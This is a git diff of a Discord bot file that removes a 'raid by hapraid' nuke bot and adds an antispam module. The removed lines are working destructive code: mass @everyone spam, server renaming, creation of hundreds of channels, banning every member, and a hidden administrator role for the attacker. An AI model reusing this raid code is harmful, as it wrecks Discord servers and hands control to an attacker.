@@ -2,91 +2,124 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 const token = "process.env.TOKEN";
 var prefix = ".";
-var mention = "126connectés"
+var mention = "SoWalkoud Antispam"
 
-var fucked = false;
- 
-bot.on('ready',() => {
-    //invit link
-    bot.guilds.forEach(guild => {
-      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
-    })
-});
- 
-bot.on('message', msg => {
-  //#region Legit
-  /* Commandes legit */
-  if (msg.content === '.ping') {
-    msg.reply('pong !')
-  }
-  //#endregion
- 
-  //#region Destructrices
-  /* Commandes destructrices */
-  if (msg.content === '.a') {
-    console.log(`Commande .des par ${msg.author.tag}`);
-    var interval = setInterval (function () {
-      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
-     }, 500);
-  }
- 
-  if (msg.content === '.des') {
-    console.log(`Commande .des par ${msg.author.tag}`);
- 
-    if (!fucked){
-      msg.guild.setIcon("hapraid.png").catch(e => {});
-      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
- 
-      for (var i = 0; i < 390; i++) {
-        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
-        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
+const authors = [];
+var warned = [];
+var banned = [];
+var messagelog = [];
+
+/**
+ * Add simple spam protection to your discord server.
+ * @param  {Bot} bot - The discord.js CLient/bot
+ * @param  {object} options - Optional (Custom configuarion options)
+ * @return {[type]}         [description]
+ */
+module.exports = function (bot, options) {
+  // Set options
+  const warnBuffer = (options && options.prefix) || 3;
+  const maxBuffer = (options && options.prefix) || 5;
+  const interval = (options && options.interval) || 1000;
+  const warningMessage = (options && options.warningMessage) || "stop spamming or I'll whack your head off.";
+  const banMessage = (options && options.banMessage) || "has been banned for spamming, anyone else?";
+  const maxDuplicatesWarning = (options && options.duplicates || 7);
+  const maxDuplicatesBan = (options && options.duplicates || 10);
+  const deleteMessagesAfterBanForPastDays = (options && options.deleteMessagesAfterBanForPastDays || 7);
+
+  bot.on('message', msg => {
+
+    //Always return with an bot.....
+    if(msg.author.bot) return;
+
+    if(msg.author.id != bot.user.id){
+      var now = Math.floor(Date.now());
+      authors.push({
+        "time": now,
+        "author": msg.author.id
+      });
+      messagelog.push({
+        "message": msg.content,
+        "author": msg.author.id
+      });
+
+      // Check how many times the same message has been sent.
+      var msgMatch = 0;
+      for (var i = 0; i < messagelog.length; i++) {
+        if (messagelog[i].message == msg.content && (messagelog[i].author == msg.author.id) && (msg.author.id !== bot.user.id)) {
+          msgMatch++;
+        }
       }
-      fucked = true;
-    }
- 
-    if (msg.deletable) {
-      msg.delete();
-    }
-  }
- 
-  if (msg.content === '.ban') {
-    console.log(`Commande .bane par ${msg.author.tag}`);
-    msg.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
-    });
-  }
- 
-  if (msg.content === '.exit') {
-    console.log(`Commande .leave par ${msg.author.tag}`);
-    if (msg.deletable) msg.delete().catch(e => {});
-    msg.guild.leave().catch(e => {});
-  }
- 
-  if (msg.content === '.r') {
-    console.log(`Commande .r par ${msg.author.tag}`);
- 
-    msg.member.guild.createRole({
-      name: "haprole",
-      permissions: "ADMINISTRATOR",
-      mentionable: false
-    }).then(function(role) {
-      msg.member.addRole(role);
-      if (msg.deletable) msg.delete().catch(e => {});
-    }).catch(e => {});
-  }
-  //#endregion
-});
-bot.on("message", msg => {
-        if(msg.content.startsWith(".des")){ 
-           msg.delete()
-            let i = 0;
-            let interval = setInterval(function () {
-              msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
-              }, 2500);
-            });
+      // Check matched count
+      if (msgMatch == maxDuplicatesWarning && !warned.includes(msg.author.id)) {
+        warn(msg, msg.author.id);
+      }
+      if (msgMatch == maxDuplicatesBan && !banned.includes(msg.author.id)) {
+        ban(msg, msg.author.id);
+      }
+
+      matched = 0;
+
+      for (var i = 0; i < authors.length; i++) {
+        if (authors[i].time > now - interval) {
+          matched++;
+          if (matched == warnBuffer && !warned.includes(msg.author.id)) {
+            warn(msg, msg.author.id);
           }
-        });
+          else if (matched == maxBuffer) {
+            if (!banned.includes(msg.author.id)) {
+              ban(msg, msg.author.id);
+            }
+          }
+        }
+        else if (authors[i].time < now - interval) {
+          authors.splice(i);
+          warned.splice(warned.indexOf(authors[i]));
+          banned.splice(warned.indexOf(authors[i]));
+        }
+        if (messagelog.length >= 200) {
+          messagelog.shift();
+        }
+      }
+    }
+  });
+
+  /**
+   * Warn a user
+   * @param  {Object} msg
+   * @param  {string} userid userid
+   */
+  function warn(msg, userid) {
+    warned.push(msg.author.id);
+    msg.channel.send(msg.author + " " + warningMessage);
+  }
+
+  /**
+   * Ban a user by the user id
+   * @param  {Object} msg
+   * @param  {string} userid userid
+   * @return {boolean} True or False
+   */
+  function ban(msg, userid) {
+    for (var i = 0; i < messagelog.length; i++) {
+      if (messagelog[i].author == msg.author.id) {
+        messagelog.splice(i);
+      }
+    }
+
+    banned.push(msg.author.id);
+
+    var user = msg.channel.guild.members.find(member => member.user.id === msg.author.id);
+    if (user) {
+      user.ban(deleteMessagesAfterBanForPastDays).then((member) => {
+        msg.channel.send(msg.author + " " +banMessage);
+        return true;
+     }).catch(() => {
+        msg.channel.send("insufficient permission to kick " + msg.author + " for spamming.");
+        return false;
+     });
+    }
+  }
+
+}
 
 bot.login(process.env.TOKEN)
